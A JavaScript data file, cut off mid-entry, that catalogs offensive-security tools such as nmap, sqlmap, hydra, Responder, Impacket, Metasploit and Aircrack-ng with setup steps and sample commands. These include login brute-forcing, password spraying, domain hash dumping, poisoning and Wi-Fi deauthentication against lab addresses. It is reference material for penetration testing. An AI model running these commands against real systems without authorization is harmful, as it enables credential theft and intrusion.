window.CYBER_RESOURCES_RED = window.CYBER_RESOURCES_RED || [];
window.CYBER_RESOURCES_RED.push(
  {
    "name": "nmap",
    "url": "https://nmap.org/",
    "cat": "red",
    "type": "tool",
    "desc": "Network discovery and service enumeration",
    "details": "## Description\nNmap ('Network Mapper') is the industry standard tool for network discovery and security auditing. It determines what hosts are available on the network, what services (application name and version) those hosts are offering, and what operating systems they are running.\n\n## Setup\n- **Linux:** `sudo apt install nmap`\n- **Windows/Mac:** Download the installer from the official site.\n\n## Usage\nRun nmap from the command line against a target IP or range. It supports scripting (NSE) to automate advanced detection.\n\n## Useful Commands\n```bash\n# Standard Service/Script scan (Output to all formats)\nnmap -sC -sV -oA output_name 10.10.11.10\n\n# Fast scan (all ports)\nnmap -p- --min-rate 1000 10.10.11.10\n\n# UDP Scan (top 100 ports)\nnmap -sU --top-ports 100 10.10.11.10\n```\n\n## Alternatives\n- **rustscan** (Faster port discovery)\n- **masscan** (High speed, less detail)",
    "source": "https://github.com/nmap/nmap",
    "binaries": "https://nmap.org/download.html",
    "tags": [
      "enumeration",
      "scanning",
      "network"
    ]
  },
  {
    "name": "masscan",
    "url": "https://github.com/robertdavidgraham/masscan",
    "cat": "red",
    "type": "tool",
    "desc": "High-speed port scanner",
    "details": "## Description\nMasscan is an internet-scale port scanner. It can scan the entire internet in under 6 minutes, capable of transmitting up to 10 million packets per second.\n\n## Setup\n```bash\nsudo apt install masscan\n# Or build from source:\ngit clone https://github.com/robertdavidgraham/masscan\ncd masscan && make\n```\n\n## Usage\nIt uses its own custom TCP/IP stack to achieve extreme speeds. It is best used for broad discovery rather than detailed service enumeration.\n\n## Useful Commands\n```bash\n# Scan a subnet for web ports at 10k packets/sec\nmasscan 10.11.1.0/24 -p80,443 --rate 10000\n\n# Save to binary format and read later\nmasscan 10.0.0.0/8 -p80 -oB output.bin\nmasscan --readscan output.bin\n```\n\n## Alternatives\n- **nmap**\n- **zmap**",
    "source": "https://github.com/robertdavidgraham/masscan",
    "binaries": null,
    "tags": [
      "enumeration",
      "scanning",
      "web"
    ]
  },
  {
    "name": "rustscan",
    "url": "https://github.com/RustScan/RustScan",
    "cat": "red",
    "type": "tool",
    "desc": "Fast port scanner with nmap integration",
    "details": "## Description\nRustScan is a modern port scanner designed for speed and intelligent piping. It uses adaptive learning to scan targets in seconds.\n\n## Setup\nDownload the `.deb` file from releases or use Docker.\n```bash\ndocker pull rustscan/rustscan:alpine\n```\n\n## Usage\nIt identifies open ports rapidly and automatically pipes them into nmap for deep service detection, saving time on closed ports.\n\n## Useful Commands\n```bash\n# Scan target and pass open ports to nmap for -sV scan\nrustscan -a 10.10.11.10 -- -sV\n\n# Adjust batch size for speed\nrustscan -b 1000 -a 10.10.11.10\n```\n\n## Alternatives\n- **masscan**\n- **naabu**",
    "source": "https://github.com/RustScan/RustScan",
    "binaries": "https://github.com/RustScan/RustScan/releases",
    "tags": [
      "scanning",
      "detection",
      "containers"
    ]
  },
  {
    "name": "amass",
    "url": "https://github.com/owasp-amass/amass",
    "cat": "red",
    "type": "tool",
    "desc": "Attack surface mapping and DNS enumeration",
    "details": "## Description\nThe OWASP Amass Project performs network mapping of attack surfaces and external asset discovery using open source information gathering and active reconnaissance techniques.\n\n## Setup\n```bash\ngo install -v [github.com/owasp-amass/amass/v3/...@master](https://github.com/owasp-amass/amass/v3/...@master)\n# Or download binary from releases\n```\n\n## Usage\nUse Amass to discover subdomains, IP addresses, and map the network infrastructure of a target organization.\n\n## Useful Commands\n```bash\n# Passive subdomain enumeration\namass enum -passive -d example.com -o results.txt\n\n# Active enum with IP resolution\namass enum -active -d example.com -ip\n```\n\n## Alternatives\n- **subfinder**\n- **theHarvester**",
    "source": "https://github.com/owasp-amass/amass",
    "binaries": "https://github.com/owasp-amass/amass/releases",
    "tags": [
      "enumeration",
      "web",
      "network"
    ]
  },
  {
    "name": "subfinder",
    "url": "https://github.com/projectdiscovery/subfinder",
    "cat": "red",
    "type": "tool",
    "desc": "Fast subdomain enumeration",
    "details": "## Description\nSubfinder is a subdomain discovery tool that discovers valid subdomains for websites by using passive online sources.\n\n## Setup\n```bash\ngo install -v [github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest](https://github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest)\n```\n\n## Usage\nIt queries passive sources (like Censys, Chaos, Recon.dev) to find subdomains without directly interacting with the target.\n\n## Useful Commands\n```bash\n# Basic scan\nsubfinder -d example.com\n\n# Scan and pipe to httpx for probing\nsubfinder -d example.com -silent | httpx -title\n```\n\n## Alternatives\n- **amass**\n- **assetfinder**",
    "source": "https://github.com/projectdiscovery/subfinder",
    "binaries": "https://github.com/projectdiscovery/subfinder/releases",
    "tags": [
      "enumeration",
      "scanning",
      "web"
    ]
  },
  {
    "name": "httpx",
    "url": "https://github.com/projectdiscovery/httpx",
    "cat": "red",
    "type": "tool",
    "desc": "HTTP probing and tech fingerprinting",
    "details": "## Description\nhttpx is a fast and multi-purpose HTTP toolkit that allows running multiple probes using the retryable http library. It is designed to handle large lists of hosts.\n\n## Setup\n```bash\ngo install -v [github.com/projectdiscovery/httpx/cmd/httpx@latest](https://github.com/projectdiscovery/httpx/cmd/httpx@latest)\n```\n\n## Usage\nPipe a list of domains or IPs into httpx to verify they are running a web server, check status codes, and grab titles.\n\n## Useful Commands\n```bash\n# Probe list of hosts for status and title\ncat hosts.txt | httpx -title -status-code -tech-detect\n\n# Check for specific paths\ncat hosts.txt | httpx -path /admin -status-code\n```\n\n## Alternatives\n- **httprobe**\n- **whatweb**",
    "source": "https://github.com/projectdiscovery/httpx",
    "binaries": "https://github.com/projectdiscovery/httpx/releases",
    "tags": [
      "enumeration",
      "scanning",
      "web"
    ]
  },
  {
    "name": "naabu",
    "url": "https://github.com/projectdiscovery/naabu",
    "cat": "red",
    "type": "tool",
    "desc": "Fast port discovery",
    "details": "## Description\nNaabu is a port scanning tool written in Go that allows you to enumerate valid ports for targets in a fast and reliable manner.\n\n## Setup\n```bash\ngo install -v [github.com/projectdiscovery/naabu/v2/cmd/naabu@latest](https://github.com/projectdiscovery/naabu/v2/cmd/naabu@latest)\n```\n\n## Usage\nIt is often used in reconnaissance pipelines to filter live ports before passing them to other tools.\n\n## Useful Commands\n```bash\n# Scan top 100 ports\nnaabu -host example.com -top-ports 100\n\n# Full scan excluding CDN ranges\nnaabu -host example.com -p - -exclude-cdn\n```\n\n## Alternatives\n- **nmap**\n- **masscan**",
    "source": "https://github.com/projectdiscovery/naabu",
    "binaries": "https://github.com/projectdiscovery/naabu/releases",
    "tags": [
      "enumeration",
      "scanning",
      "web"
    ]
  },
  {
    "name": "nuclei",
    "url": "https://github.com/projectdiscovery/nuclei",
    "cat": "red",
    "type": "tool",
    "desc": "Template-based vulnerability scanning",
    "details": "## Description\nNuclei is a modern, fast vulnerability scanner that uses simple YAML-based templates to detect vulnerabilities.\n\n## Setup\n```bash\ngo install -v [github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest](https://github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest)\n# Update templates\nnuclei -update-templates\n```\n\n## Usage\nRun nuclei against a list of targets using community templates to find CVEs, misconfigurations, and exposed panels.\n\n## Useful Commands\n```bash\n# Scan list of URLs with all templates\nnuclei -l urls.txt\n\n# Scan only for critical CVEs\nnuclei -u https://example.com -tags cve,critical\n\n# Scan for specific tech (e.g., jira)\nnuclei -u https://example.com -tags jira\n```\n\n## Alternatives\n- **Nessus**\n- **OpenVAS**",
    "source": "https://github.com/projectdiscovery/nuclei",
    "binaries": "https://github.com/projectdiscovery/nuclei/releases",
    "tags": [
      "vulnerability scanning",
      "scanning",
      "web"
    ]
  },
  {
    "name": "ffuf",
    "url": "https://github.com/ffuf/ffuf",
    "cat": "red",
    "type": "tool",
    "desc": "Fast web fuzzer and content discovery",
    "details": "## Description\nFfuf (Fuzz Faster U Fool) is a fast web fuzzer written in Go. It allows you to discover directories, files, or fuzz parameters.\n\n## Setup\n```bash\ngo install [github.com/ffuf/ffuf/v2@latest](https://github.com/ffuf/ffuf/v2@latest)\n```\n\n## Usage\nUse wordlists to brute-force URLs or parameters. Replace the fuzzing point with the keyword `FUZZ`.\n\n## Useful Commands\n```bash\n# Directory brute force (filter 404s)\nffuf -u https://target.com/FUZZ -w /path/to/wordlist.txt -fc 404\n\n# Fuzzing a POST parameter\nffuf -u https://target.com/login -X POST -d \"user=admin&pass=FUZZ\" -w passlist.txt -mr \"Welcome\"\n\n# VHost discovery\nffuf -u https://target.com -H \"Host: FUZZ.target.com\" -w subdomains.txt -fs [size_of_default_response]\n```\n\n## Alternatives\n- **gobuster**\n- **dirsearch**",
    "source": "https://github.com/ffuf/ffuf",
    "binaries": "https://github.com/ffuf/ffuf/releases",
    "tags": [
      "enumeration",
      "fuzzing",
      "bruteforce"
    ]
  },
  {
    "name": "gobuster",
    "url": "https://github.com/OJ/gobuster",
    "cat": "red",
    "type": "tool",
    "desc": "Directory/DNS/VHost brute forcing",
    "details": "## Description\nGobuster is a tool used to brute-force URIs (directories and files) in web sites, DNS subdomains, and Virtual Host names.\n\n## Setup\n```bash\ngo install [github.com/OJ/gobuster/v3@latest](https://github.com/OJ/gobuster/v3@latest)\n```\n\n## Usage\nSelect a mode (dir, dns, vhost) and provide a wordlist to start enumerating.\n\n## Useful Commands\n```bash\n# Directory scan\ngobuster dir -u https://example.com -w wordlist.txt -t 50\n\n# DNS scan\ngobuster dns -d example.com -w subdomains.txt\n\n# VHost scan\ngobuster vhost -u https://example.com -w subdomains.txt\n```\n\n## Alternatives\n- **ffuf**\n- **feroxbuster**",
    "source": "https://github.com/OJ/gobuster",
    "binaries": "https://github.com/OJ/gobuster/releases",
    "tags": [
      "bruteforce",
      "enumeration",
      "scanning"
    ]
  },
  {
    "name": "feroxbuster",
    "url": "https://github.com/epi052/feroxbuster",
    "cat": "red",
    "type": "tool",
    "desc": "Recursive content discovery",
    "details": "## Description\nFeroxbuster is a fast, simple, recursive content discovery tool written in Rust. It automatically handles recursion (finding a directory and scanning inside it).\n\n## Setup\nDownload binary from releases or install via zip.\n\n## Usage\nRun against a target URL. It will automatically crawl found directories based on your wordlist.\n\n## Useful Commands\n```bash\n# Standard recursive scan looking for specific extensions\nferoxbuster -u https://example.com -w wordlist.txt -x php,html,txt\n\n# No recursion, specific depth\nferoxbuster -u https://example.com --depth 1\n```\n\n## Alternatives\n- **gobuster**\n- **dirsearch**",
    "source": "https://github.com/epi052/feroxbuster",
    "binaries": "https://github.com/epi052/feroxbuster/releases",
    "tags": [
      "enumeration",
      "scanning",
      "web"
    ]
  },
  {
    "name": "dirsearch",
    "url": "https://github.com/maurosoria/dirsearch",
    "cat": "red",
    "type": "tool",
    "desc": "Web path brute forcing",
    "details": "## Description\nDirsearch is a mature, feature-rich command-line tool designed to brute force directories and files in webservers.\n\n## Setup\n```bash\ngit clone https://github.com/maurosoria/dirsearch.git\npip install -r requirements.txt\n```\n\n## Usage\nA python based web path scanner. Useful for its extensive default wordlist and ease of use.\n\n## Useful Commands\n```bash\n# Simple scan with extensions\npython3 dirsearch.py -u https://target.com -e php,txt,zip\n\n# High speed with threads\npython3 dirsearch.py -u https://target.com -t 50 --random-agent\n```\n\n## Alternatives\n- **ffuf**\n- **gobuster**",
    "source": "https://github.com/maurosoria/dirsearch",
    "binaries": null,
    "tags": [
      "bruteforce",
      "enumeration",
      "scanning"
    ]
  },
  {
    "name": "Burp Suite",
    "url": "https://portswigger.net/burp",
    "cat": "red",
    "type": "tool",
    "desc": "Web testing proxy and toolkit",
    "details": "## Description\nBurp Suite is an integrated platform for performing security testing of web applications. It is the industry standard for manual web testing.\n\n## Setup\nDownload the installer (Community or Pro) from PortSwigger.\n\n## Usage\nBurp is an intercepting proxy. Configure your browser to proxy through `127.0.0.1:8080`. Install the CA certificate by visiting `http://burp` in the proxied browser.\n\n## Key Features\n- **Proxy:** Intercept and modify traffic.\n- **Repeater:** Manually resend requests with modifications.\n- **Intruder:** Fuzz parameters (throttled in Community).\n- **Decoder:** Base64/URL encode/decode tools.\n\n## Alternatives\n- **OWASP ZAP**\n- **Caido**",
    "source": null,
    "binaries": "https://portswigger.net/burp/releases",
    "tags": [
      "enumeration",
      "fuzzing",
      "web"
    ]
  },
  {
    "name": "OWASP ZAP",
    "url": "https://www.zaproxy.org/",
    "cat": "red",
    "type": "tool",
    "desc": "Open-source web proxy and scanner",
    "details": "## Description\nOWASP ZAP (Zed Attack Proxy) is a free, open-source penetration testing tool for finding vulnerabilities in web applications.\n\n## Setup\nDownload the installer for your OS. Requires Java 8+.\n\n## Usage\nIt sits between your browser and the web application to intercept and inspect messages.\n\n## Key Features\n- **Automated Scanner:** Spiders and scans for vulnerabilities automatically.\n- **Fuzzer:** Payload injection.\n- **HUD:** Heads Up Display for testing in-browser.\n\n## Alternatives\n- **Burp Suite**",
    "source": "https://github.com/zaproxy/zaproxy",
    "binaries": "https://www.zaproxy.org/download/",
    "tags": [
      "exploitation",
      "enumeration",
      "fuzzing"
    ]
  },
  {
    "name": "mitmproxy",
    "url": "https://mitmproxy.org/",
    "cat": "red",
    "type": "tool",
    "desc": "Scriptable intercepting proxy",
    "details": "## Description\nmitmproxy is a free and open-source interactive HTTPS proxy. It allows you to intercept, inspect, modify, and replay web traffic.\n\n## Setup\n```bash\npip install mitmproxy\n```\n\n## Usage\nA terminal-based interactive man-in-the-middle proxy. Great for debugging and scripting (using Python) traffic modification.\n\n## Useful Commands\n```bash\n# Start the interactive interface\nmitmproxy\n\n# Start web interface\nmitmweb\n\n# Save traffic to file\nmitmproxy -w outfile.flow\n```\n\n## Alternatives\n- **Burp Suite**\n- **Fiddler**",
    "source": "https://github.com/mitmproxy/mitmproxy",
    "binaries": "https://mitmproxy.org/downloads/",
    "tags": [
      "web"
    ]
  },
  {
    "name": "sqlmap",
    "url": "https://sqlmap.org/",
    "cat": "red",
    "type": "tool",
    "desc": "SQL injection testing automation",
    "details": "## Description\nSQLMap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.\n\n## Setup\n```bash\ngit clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev\n```\n\n## Usage\nProvide it with a URL or a saved request file, and it will attempt to identify the injection point and dump data.\n\n## Useful Commands\n```bash\n# GET request injection\npython sqlmap.py -u \"http://target.com/vuln.php?id=1\" --batch\n\n# Capture a request in Burp, save to file, and run:\npython sqlmap.py -r request.txt --level 5 --risk 3\n\n# Dump database data\npython sqlmap.py -u \"...\" --dump\n```\n\n## Alternatives\n- **Ghauri**\n- **Manual Injection**",
    "source": "https://github.com/sqlmapproject/sqlmap",
    "binaries": "https://github.com/sqlmapproject/sqlmap/releases",
    "tags": [
      "web",
      "database"
    ]
  },
  {
    "name": "nikto",
    "url": "https://cirt.net/Nikto2",
    "cat": "red",
    "type": "tool",
    "desc": "Web server scanner (misconfigurations)",
    "details": "## Description\nNikto is an Open Source (GPL) web server scanner which performs comprehensive tests against web servers for multiple items, including over 6700 potentially dangerous files/programs.\n\n## Setup\n```bash\nsudo apt install nikto\n# Or clone from GitHub\n```\n\n## Usage\nRun against a target to identify outdated server software and configuration problems.\n\n## Useful Commands\n```bash\n# Basic scan\nnikto -h http://example.com\n\n# Scan with SSL and specific port\nnikto -h https://example.com -p 443\n```\n\n## Alternatives\n- **nuclei**\n- **nessus**",
    "source": "https://github.com/sullo/nikto",
    "binaries": "https://github.com/sullo/nikto/releases",
    "tags": [
      "scanning",
      "web"
    ]
  },
  {
    "name": "Metasploit Framework",
    "url": "https://www.metasploit.com/",
    "cat": "red",
    "type": "tool",
    "desc": "Exploit framework ",
    "details": "## Description\nThe Metasploit Framework is the world's most used penetration testing framework. It aids in discovering, exploiting, and validating vulnerabilities.\n\n## Setup\nDownload the installer from Rapid7 or use the nightly script:\n```bash\ncurl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall\n```\n\n## Usage\nLaunch `msfconsole` to access the interactive shell where you can search for and use exploits, auxiliary modules, and payloads.\n\n## Useful Commands\n```bash\n# Start console\nmsfconsole\n\n# Inside console:\nsearch ms17-010\nuse 0\nset RHOSTS 10.10.10.10\nrun\n```\n\n## Alternatives\n- **Sliver**\n- **Cobalt Strike**",
    "source": "https://github.com/rapid7/metasploit-framework",
    "binaries": "https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers",
    "tags": [
      "exploitation",
      "web",
      "framework"
    ]
  },
  {
    "name": "BloodHound",
    "url": "https://github.com/SpecterOps/BloodHound",
    "cat": "red",
    "type": "tool",
    "desc": "Active Directory attack path analysis",
    "details": "## Description\nBloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment, helping identify attack paths.\n\n## Setup\nRequires Neo4j database. \n1. Install Neo4j.\n2. Download BloodHound GUI binary.\n3. Run `SharpHound.exe` or `bloodhound-python` to gather data.\n\n## Usage\nCollect data using an ingestor (SharpHound/AzureHound), import the data into BloodHound, and query the graph for shortest paths to Domain Admin.\n\n## Useful Commands\n```bash\n# Python ingestor (from Linux)\nbloodhound-python -u user -p pass -ns 10.10.10.10 -d domain.local -c All\n```\n\n## Alternatives\n- **PingCastle**\n- **Adkins**",
    "source": "https://github.com/SpecterOps/BloodHound",
    "binaries": "https://github.com/SpecterOps/BloodHound/releases",
    "tags": [
      "active directory",
      "malware analysis",
      "database"
    ]
  },
  {
    "name": "PingCastle",
    "url": "https://www.pingcastle.com/",
    "cat": "red",
    "type": "tool",
    "desc": "Active Directory security assessment",
    "details": "## Description\nPingCastle is a tool designed to assess the security level of an Active Directory environment quickly.\n\n## Setup\nDownload the `.exe` (C# application). No installation required, just unzip.\n\n## Usage\nRun the executable in a terminal on a domain-joined machine (or via runas). It generates an HTML report detailing AD security risks.\n\n## Useful Commands\n```cmd\n# Interactive mode\nPingCastle.exe\n\n# Healthcheck only\nPingCastle.exe --healthcheck --server domain.com\n```\n\n## Alternatives\n- **Purple Knight**\n- **BloodHound**",
    "source": "https://github.com/vletoux/pingcastle",
    "binaries": "https://www.pingcastle.com/download",
    "tags": [
      "active directory"
    ]
  },
  {
    "name": "Responder",
    "url": "https://github.com/lgandx/Responder",
    "cat": "red",
    "type": "tool",
    "desc": "LLMNR/NBT-NS/mDNS poisoning (lab/authorized)",
    "details": "## Description\nResponder is a LLMNR, NBT-NS and MDNS poisoner. It answers specific NetBIOS queries based on their name suffix to spoof the server and capture credentials.\n\n## Setup\n```bash\ngit clone https://github.com/lgandx/Responder.git\n```\n\n## Usage\nRun on a local network segment to listen for multicast requests. Best used to capture NTLMv2 hashes from Windows clients.\n\n## Useful Commands\n```bash\n# Start poisoning on interface eth0\nsudo python3 Responder.py -I eth0 -dDw\n\n# Analyze mode (no poisoning)\nsudo python3 Responder.py -I eth0 -A\n```\n\n## Alternatives\n- **Inveigh** (PowerShell/Windows)",
    "source": "https://github.com/lgandx/Responder",
    "binaries": null,
    "tags": [
      "credential access",
      "web",
      "network"
    ]
  },
  {
    "name": "hydra",
    "url": "https://github.com/vanhauser-thc/thc-hydra",
    "cat": "red",
    "type": "tool",
    "desc": "Fast network login brute forcer",
    "details": "## Description\nHydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add.\n\n## Setup\n```bash\nsudo apt install hydra\n# Or build from source:\ngit clone https://github.com/vanhauser-thc/thc-hydra.git\ncd thc-hydra && ./configure && make && sudo make install\n```\n\n## Usage\nSupports protocols like SSH, FTP, HTTP, SMB, RDP, and many more for credential brute forcing.\n\n## Useful Commands\n```bash\n# SSH brute force\nhydra -l admin -P passwords.txt ssh://10.10.10.10\n\n# HTTP POST form brute force\nhydra -l admin -P passwords.txt 10.10.10.10 http-post-form \"/login:username=^USER^&password=^PASS^:Invalid\"\n\n# SMB password spray\nhydra -L users.txt -p Password123 smb://10.10.10.10\n```\n\n## Alternatives\n- **Medusa**\n- **Ncrack**",
    "source": "https://github.com/vanhauser-thc/thc-hydra",
    "binaries": "https://github.com/vanhauser-thc/thc-hydra/releases",
    "tags": [
      "credential access",
      "bruteforce",
      "enumeration"
    ]
  },
  {
    "name": "CeWL",
    "url": "https://github.com/digininja/CeWL",
    "cat": "red",
    "type": "tool",
    "desc": "Custom wordlist generator from websites",
    "details": "## Description\nCeWL (Custom Word List generator) is a ruby app which spiders a given URL, up to a specified depth, and returns a list of words which can be used for password cracking.\n\n## Setup\n```bash\nsudo apt install cewl\n# Or from source:\ngem install cewl\n```\n\n## Usage\nCreate targeted wordlists based on content from the target's website, often more effective than generic wordlists.\n\n## Useful Commands\n```bash\n# Generate wordlist from site (depth 2)\ncewl -d 2 -m 5 https://example.com -w wordlist.txt\n\n# Include email addresses\ncewl -d 2 -e https://example.com -w wordlist.txt\n\n# Generate with uppercase variations\ncewl -d 2 --with-numbers https://example.com -w wordlist.txt\n```\n\n## Alternatives\n- **BurpSuite Pro** (Content Discovery)\n- **Crunch**",
    "source": "https://github.com/digininja/CeWL",
    "binaries": null,
    "tags": [
      "credential access",
      "enumeration",
      "web"
    ]
  },
  {
    "name": "Impacket",
    "url": "https://github.com/fortra/impacket",
    "cat": "red",
    "type": "tool",
    "desc": "Network protocol tooling (lab/authorized)",
    "details": "## Description\nImpacket is a collection of Python classes for working with network protocols. It includes famous scripts like `psexec.py`, `smbexec.py`, and `secretsdump.py`.\n\n## Setup\n```bash\npython3 -m pip install impacket\n# Or install via pipx for isolated environments\npipx install impacket\n```\n\n## Usage\nUse individual scripts from the library to interact with network services (SMB, Kerberos, MSSQL, etc.).\n\n## Useful Commands\n```bash\n# Dump hashes from Domain Controller (DCSync)\nsecretsdump.py domain/user:pass@10.10.10.10\n\n# Get a shell via SMB\npsexec.py domain/user:pass@10.10.10.10\n```\n\n## Alternatives\n- **NetExec**",
    "source": "https://github.com/fortra/impacket",
    "binaries": "https://github.com/fortra/impacket/releases",
    "tags": [
      "credential access",
      "network",
      "training"
    ]
  },
  {
    "name": "WiFi Pineapple (concept)",
    "url": "https://shop.hak5.org/products/wifi-pineapple",
    "cat": "red",
    "type": "tool",
    "desc": "Wireless assessment platform (hardware)",
    "details": "## Description\nThe WiFi Pineapple is a hardware platform used for Wi-Fi auditing and man-in-the-middle attacks.\n\n## Setup\nPhysical hardware setup required. Connect via USB-C or Wi-Fi to the management interface (usually `172.16.42.1:1471`).\n\n## Usage\nAutomates Wi-Fi auditing (Evil Twin attacks, Rogue AP, Karma attacks) controlled via a web interface.\n\n## Workflow\n1. Recon: Scan for APs.\n2. PineAP: Enable to mimic networks client devices are searching for.\n3. Harvest: Capture WPA handshakes or creds from captive portals.\n\n## Alternatives\n- **Raspberry Pi + Aircrack-ng**",
    "source": null,
    "binaries": null,
    "tags": [
      "enumeration",
      "scanning",
      "web"
    ]
  },
  {
    "name": "Aircrack-ng",
    "url": "https://www.aircrack-ng.org/",
    "cat": "red",
    "type": "tool",
    "desc": "Wireless auditing suite ",
    "details": "## Description\nAircrack-ng is a complete suite of tools to assess WiFi network security. It focuses on Monitoring, Attacking, Testing, and Cracking.\n\n## Setup\n```bash\nsudo apt install aircrack-ng\n```\n\n## Usage\nUse airmon-ng to enable monitor mode, airodump-ng to capture packets, and aircrack-ng to crack the hashes.\n\n## Useful Commands\n```bash\n# Kill interfering processes\nairmon-ng check kill\n\n# Start monitor mode\nairmon-ng start wlan0\n\n# Capture traffic\nairodump-ng wlan0mon\n\n# Deauth attack (force handshake capture)\naireplay-ng -0 10 -a [BSSID] wlan0mon\n```\n\n## Alternatives\n- **Kismet**\n- **Wifite**",
    "source": "https://github.com/aircrack-ng/aircrack-ng",
    "binaries": "https://www.aircrack-ng.org/downloads.html",
    "tags": [
      "credential access",
      "network",
      "detection"
    ]
  },
  {
    "name": "Kismet",
    "url": "https://www.kismetwireless.net/",
    "cat": "red",
    "type": "tool",
    "desc": "Wireless network detector and sniffer",
    "details": "## Description\nKismet is a detector, sniffer, and intrusion detection system for 802.11 Wi-Fi. It works passively without sending packets.\n\n## Setup\n```bash\nsudo apt install kismet\n```\n\n## Usage\nRun Kismet to passively discover wireless networks, devices, and map them.\n\n## Useful Commands\n```bash\n# Start server (access via Web UI at localhost:2501)\nsudo kismet -c wlan0\n```\n\n## Alternatives\n- **Airodump-ng**",
    "source": "https://github.com/kismetwireless/kismet",
    "binaries": "https://www.kismetwireless.net/downloads/",
    "tags": [
      "web",
      "network",
      "detection"
    ]
  },
  {
    "name": "TruffleHog",
    "url": "https://trufflesecurity.com/",
    "cat": "red",
    "type": "tool",
    "desc": "Secret scanning for repos and files",
    "details": "## Description\nTruffleHog searches through git repositories for secrets, digging deep into commit history and branches.\n\n## Setup\n```bash\n# Docker\ndocker run -it trufflesecurity/trufflehog:latest github --repo https://github.com/trufflesecurity/test_keys\n# Binary\ncurl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sh -s -- -b /usr/local/bin\n```\n\n## Usage\nFinds credentials, keys, and secrets in git repositories, filesystems, and S3 buckets.\n\n## Useful Commands\n```bash\n# Scan a remote repo\ntrufflehog git https://github.com/user/repo\n\n# Scan filesystem\ntrufflehog filesystem ./path/to/source\n```\n\n## Alternatives\n- **Gitleaks**",
    "source": "https://github.com/trufflesecurity/trufflehog",
    "binaries": "https://github.com/trufflesecurity/trufflehog/releases",
    "tags": [
      "scanning",
      "web",
      "malware analysis"
    ]
  },
  {
    "name": "Gitleaks",
    "url": "https://gitleaks.io/",
    "cat": "red",
    "type": "tool",
    "desc": "Secret detection for codebases",
    "details": "## Description\nGitleaks is a SAST tool for detecting hardcoded secrets like passwords, api keys, and tokens in git repos.\n\n## Setup\nInstall via brew, docker, or binary.\n```bash\nbrew install gitleaks\n```\n\n## Usage\nRun detecting against your current repository or specific history to prevent secrets from leaking.\n\n## Useful Commands\n```bash\n# Detect secrets in current repo\ngitleaks detect --source . -v\n\n# Scan a specific git history\ngitleaks detect --source . --log-opts=\"--all\"\n```\n\n## Alternatives\n- **TruffleHog**",
    "source": "https://github.com/gitleaks/gitleaks",
    "binaries": "https://github.com/gitleaks/gitleaks/releases",
    "tags": [
      "scanning",
      "malware analysis",
      "detection"
    ]
  },
  {
    "name": "Semgrep",
    "url": "https://semgrep.dev/",
    "cat": "red",
    "type": "tool",
    "desc": "Lightweight static analysis (SAST)",
    "details": "## Description\nSemgrep is a fast, open-source static analysis tool for finding bugs and enforcing code standards at editor, commit, and CI time.\n\n## Setup\n```bash\npython3 -m pip install semgrep\n```\n\n## Usage\nUse it to scan local code for security vulnerabilities using pre-built or custom rules.\n\n## Useful Commands\n```bash\n# Run with auto-config (community rules)\nsemgrep scan --config=auto .\n\n# Run specific security ruleset\nsemgrep scan --config=p/security-audit .\n```\n\n## Alternatives\n- **CodeQL**\n- **SonarQube**",
    "source": "https://github.com/semgrep/semgrep",
    "binaries": null,
    "tags": [
      "scanning",
      "malware analysis"
    ]
  },
  {
    "name": "CodeQL",
    "url": "https://codeql.github.com/",
    "cat": "red",
    "type": "tool",
    "desc": "Semantic code analysis and query language",
    "details": "## Description\nCodeQL treats code like data, allowing you to find vulnerabilities by writing queries to explore patterns in the code.\n\n## Setup\nDownload the CodeQL CLI bundle from GitHub releases.\n\n## Usage\nCreate a database from the source code and then run QL queries against it to identify security issues.\n\n## Useful Commands\n```bash\n# Create DB\ncodeql database create my-db --language=python\n\n# Analyze\ncodeql database analyze my-db android-security-queries.qls --format=csv --output=results.csv\n```\n\n## Alternatives\n- **Semgrep**",
    "source": "https://github.com/github/codeql",
    "binaries": "https://github.com/github/codeql-cli-binaries/releases",
    "tags": [
      "mobile",
      "database"
    ]
  },
  {
    "name": "theHarvester",
    "url": "https://github.com/laramies/theHarvester",
    "cat": "red",
    "type": "tool",
    "desc": "Email/subdomain/OSINT collection",
    "details": "## Description\ntheHarvester is a simple to use, yet effective tool for gathering emails, subdomains, hostnames, open ports and banners from different public sources.\n\n## Setup\n```bash\ngit clone https://github.com/laramies/theHarvester.git\ncd theHarvester\npip install -r requirements.txt\n```\n\n## Usage\nRun the tool against a domain to collect OSINT data from search engines like Google, Bing, and PGP servers.\n\n## Useful Commands\n```bash\n# Search all sources, limit 500 results\ntheHarvester -d example.com -l 500 -b all\n```\n\n## Alternatives\n- **SpiderFoot**\n- **Recon-ng**",
    "source": "https://github.com/laramies/theHarvester",
    "binaries": null,
    "tags": [
      "osint",
      "enumeration",
      "web"
    ]
  },
  {
    "name": "SpiderFoot",
    "url": "https://www.spiderfoot.net/",
    "cat": "red",
    "type": "tool",
    "desc": "Automated OSINT collection",
    "details": "## Description\nSpiderFoot is an open source intelligence (OSINT) automation tool. It integrates with over 200 modules to gather intelligence about a given target.\n\n## Setup\n```bash\ngit clone https://github.com/smicallef/spiderfoot.git\npip install -r requirements.txt\n```\n\n## Usage\nBest used via its web interface to visualize data. It scans IP addresses, domain names, e-mail addresses, and names.\n\n## Useful Commands\n```bash\n# Start the Web UI (easiest way to use)\npython3 sf.py -l 127.0.0.1:5001\n```\n\n## Alternatives\n- **Maltego**\n- **theHarvester**",
    "source": "https://github.com/smicallef/spiderfoot",
    "binaries": "https://github.com/smicallef/spiderfoot/releases",
    "tags": [
      "osint",
      "web"
    ]
  },
  {
    "name": "sqlfluff",
    "url": "https://sqlfluff.com/",
    "cat": "red",
    "type": "tool",
    "desc": "SQL linter/formatter (data security hygiene)",
